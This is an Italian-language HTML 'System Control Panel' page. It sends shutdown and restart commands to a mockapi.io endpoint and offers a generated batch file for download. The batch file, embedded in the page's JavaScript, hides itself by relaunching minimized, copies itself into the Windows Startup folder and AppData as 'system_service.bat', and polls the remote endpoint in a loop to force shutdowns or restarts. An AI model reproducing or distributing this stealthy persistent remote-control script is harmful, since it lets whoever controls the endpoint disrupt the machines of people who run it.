<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #333;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 500px;
            padding: 30px;
            text-align: center;
        }
        
        h1 {
            font-weight: 300;
            margin-bottom: 10px;
            color: #2c3e50;
            font-size: 28px;
        }
        
        .subtitle {
            color: #7f8c8d;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .commands {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .btn {
            border: none;
            padding: 15px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }
        
        .btn-shutdown {
            background: linear-gradient(to right, #e74c3c, #c0392b);
            color: white;
        }
        
        .btn-restart {
            background: linear-gradient(to right, #3498db, #2980b9);
            color: white;
        }
        
        .btn-download {
            background: linear-gradient(to right, #2ecc71, #27ae60);
            color: white;
            margin-top: 10px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .status {
            margin-top: 25px;
            padding: 15px;
            border-radius: 8px;
            background-color: #f8f9fa;
            display: none;
        }
        
        .countdown {
            font-size: 13px;
            margin-top: 10px;
            color: #e74c3c;
            font-weight: 500;
        }
        
        .download-section {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #eee;
        }
        
        .icon {
            font-size: 20px;
        }
        
        .log {
            margin-top: 20px;
            text-align: left;
            font-size: 12px;
            max-height: 120px;
            overflow-y: auto;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 6px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>System Control Panel</h1>
        <p class="subtitle">Controllo remoto del sistema</p>
        
        <div class="commands">
            <button class="btn btn-shutdown" onclick="sendCommand('SHUTDOWN')">
                <span class="icon">ðŸ”´</span>
                Spegni il sistema
            </button>
            
            <button class="btn btn-restart" onclick="sendCommand('RESTART')">
                <span class="icon">ðŸ”„</span>
                Riavvia il sistema
            </button>
        </div>
        
        <div id="status" class="status">
            <div id="status-message"></div>
            <div id="countdown" class="countdown"></div>
        </div>
        
        <div class="download-section">
            <button class="btn btn-download" onclick="downloadBatFile()">
                <span class="icon">ðŸ“¥</span>
                Scarica il file di controllo
            </button>
        </div>
        
        <div id="log" class="log"></div>
    </div>

    <script>
        const endpoint = "https://68b36d2fc28940c9e69eddeb.mockapi.io/shutdown_commands";
        let countdownInterval;
        
        function addLog(message) {
            const log = document.getElementById('log');
            log.style.display = 'block';
            const now = new Date().toLocaleTimeString();
            log.innerHTML = `[${now}] ${message}<br>${log.innerHTML}`;
        }
        
        function sendCommand(command) {
            // Disabilita i pulsanti durante l'invio
            document.querySelectorAll('.btn').forEach(btn => {
                btn.disabled = true;
            });
            
            const status = document.getElementById('status');
            const statusMessage = document.getElementById('status-message');
            const countdown = document.getElementById('countdown');
            
            status.style.display = 'block';
            statusMessage.textContent = `Invio comando ${command} in corso...`;
            
            fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    command: command,
                    timestamp: new Date().toISOString()
                })
            })
            .then(response => {
                if (response.ok) {
                    statusMessage.innerHTML = `<strong>Comando ${command} inviato con successo!</strong>`;
                    status.style.background = '#e8f5e9';
                    addLog(`COMANDO ${command} INVIATO`);
                    
                    // Avvia il countdown di 20 secondi
                    let seconds = 20;
                    countdownInterval = setInterval(() => {
                        countdown.textContent = `Il comando verrÃ  eliminato dal server in ${seconds} secondi`;
                        seconds--;
                        
                        if (seconds < 0) {
                            clearInterval(countdownInterval);
                            deleteLastCommand();
                        }
                    }, 1000);
                    
                } else {
                    throw new Error('Errore nel server');
                }
            })
            .catch(error => {
                statusMessage.innerHTML = `<strong>Errore nell'invio del comando</strong>`;
                status.style.background = '#ffebee';
                countdown.textContent = error.message;
                addLog(`ERRORE: ${error.message}`);
            })
            .finally(() => {
                // Riabilita i pulsanti
                setTimeout(() => {
                    document.querySelectorAll('.btn').forEach(btn => {
                        btn.disabled = false;
                    });
                }, 3000);
            });
        }
        
        function deleteLastCommand() {
            fetch(endpoint)
            .then(response => response.json())
            .then(commands => {
                if (commands.length > 0) {
                    const lastCommandId = commands[commands.length - 1].id;
                    
                    fetch(`${endpoint}/${lastCommandId}`, {
                        method: 'DELETE'
                    })
                    .then(response => {
                        if (response.ok) {
                            document.getElementById('countdown').textContent = "Comando eliminato dal server";
                            addLog("Comando eliminato dal server");
                        }
                    });
                }
            });
        }
        
        function downloadBatFile() {
            const batContent = `@echo off\nif not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit\n\ncopy "%~f0" "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system_service.bat" >nul 2>&1\ncopy "%~f0" "%AppData%\\system_service.bat" >nul 2>&1\n\nset "endpoint=https://68b36d2fc28940c9e69eddeb.mockapi.io/shutdown_commands"\nset "check_interval=10"\n\n:loop\npowershell -Command "try {$response = Invoke-RestMethod -Uri '%%endpoint%%' -Method GET; if ($response.command -eq 'SHUTDOWN') {shutdown /s /f /t 0} if ($response.command -eq 'RESTART') {shutdown /r /f /t 0}} catch {}"\n\ntimeout /t %check_interval% /nobreak >nul\ngoto loop`;
            
            const blob = new Blob([batContent], { type: 'application/bat' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'system_control.bat';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            addLog("File BAT scaricato");
        }
        
        addLog("Sistema di controllo inizializzato");
    </script>
</body>
</html>
